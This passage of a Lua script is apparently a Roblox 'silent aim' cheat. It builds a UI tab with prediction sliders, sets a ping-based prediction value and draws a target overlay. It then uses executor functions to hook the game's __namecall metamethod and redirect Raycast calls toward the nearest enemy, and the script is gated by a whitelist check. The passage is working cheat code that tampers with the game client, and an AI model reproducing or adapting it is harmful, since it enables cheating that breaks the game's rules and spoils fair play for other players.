        Name = "Manual Prediction",
        Default = silentAimConfig.SA.MHP,
        Callback = function(val)
            silentAimConfig.SA.MHP = val
        end
    })
    SilentAimTab:AddToggle({
        Name = "Auto Prediction",
        Default = silentAimConfig.SA.AP,
        Callback = function(val)
            silentAimConfig.SA.AP = val
        end
    })
    SilentAimTab:AddSlider({
        Name = "Prediction Amount",
        Min = 0.165,
        Max = 1,
        Increment = 0.001,
        Default = silentAimConfig.SA.MHP_A,
        Callback = function(val)
            silentAimConfig.SA.MHP_A = val
        end
    })
    SilentAimTab:AddSection({
        Name = "Visuals"
    })
    SilentAimTab:AddToggle({
        Name = "Show Silent Aim Target",
        Default = silentAimConfig.SA.Show,
        Callback = function(val)
            silentAimConfig.SA.Show = val
            silentAimConfig.MBX.Visible = val
        end
    })
    SilentAimTab:AddColorpicker({
        Name = "Silent Aim Target Color",
        Default = silentAimConfig.SA.Col,
        Callback = function(val)
            silentAimConfig.SA.Col = val
            silentAimConfig.MBX.Color = val
        end
    })
    heartbeat:Connect(function()
        if silentAimConfig.SA.AP then
            local ok, pingStr = pcall(function()
                return silentAimConfig.ST.Network.ServerStatsItem["Data Ping"]:GetValueString()
            end)
            if ok then
                local ping = tonumber(pingStr:match("(%d+)")) or 50
                if ping < 20 then
                    silentAimConfig.CPA = 0.11
                elseif ping < 30 then
                    silentAimConfig.CPA = 0.115
                elseif ping < 40 then
                    silentAimConfig.CPA = 0.12
                elseif ping < 50 then
                    silentAimConfig.CPA = 0.125
                elseif ping < 60 then
                    silentAimConfig.CPA = 0.13
                elseif ping < 70 then
                    silentAimConfig.CPA = 0.135
                elseif ping < 80 then
                    silentAimConfig.CPA = 0.14
                elseif ping < 90 then
                    silentAimConfig.CPA = 0.145
                elseif ping < 100 then
                    silentAimConfig.CPA = 0.15
                elseif ping < 110 then
                    silentAimConfig.CPA = 0.155
                else
                    silentAimConfig.CPA = 0.16
                end
            end
        else
            silentAimConfig.CPA = silentAimConfig.SA.MHP_A
        end
    end)
    renderStepped:Connect(function()
        if silentAimConfig.SA.Show and (silentAimConfig.SA.En and drawingSupported) then
            if GCP() then
                local targetPart = GCP().Parent.PrimaryPart or GCP()
                local viewportPos, onScreen = worldToViewportFunc(silentAimConfig.Cam, targetPart.Position)
                silentAimConfig.MBX.Visible = onScreen
                silentAimConfig.MBX.Position = Vector2.new(viewportPos.X, viewportPos.Y)
            else
                silentAimConfig.MBX.Visible = false
                silentAimConfig.MBX.Position = Vector2.new()
            end
        end
    end)
    local isCallerCheck = checkcaller or function()
        return false
    end
    local newClosureFunc = newcclosure or function(fn)
        return fn
    end
    local hookSucceeded = false
    if hookmetamethod then
        local _, _ = pcall(function()
            oldNC = hookmetamethod(game, "__namecall", newClosureFunc(function(...)
                local method = getnamecallmethod()
                local args = {
                    ...
                }
                local instance = args[1]
                local hitChance = Ch(silentAimConfig.SA.HC)
                if silentAimConfig.SA.En and (instance == Workspace and (not isCallerCheck() and (hitChance and (method == "Raycast" and VA(args, silentAimConfig.EA.Raycast))))) then
                    local origin = args[2]
                    local closestPart = GCP()
                    if closestPart then
                        args[3] = GD(origin, GPP(closestPart))
                        return oldNC(unpack(args))
                    end
                end
                return oldNC(...)
            end))
            hookSucceeded = true
        end)
    end
    orionLibRef:Init()
else
    LocalPlayer:Kick("Whitelist services down. Try again later.")
end
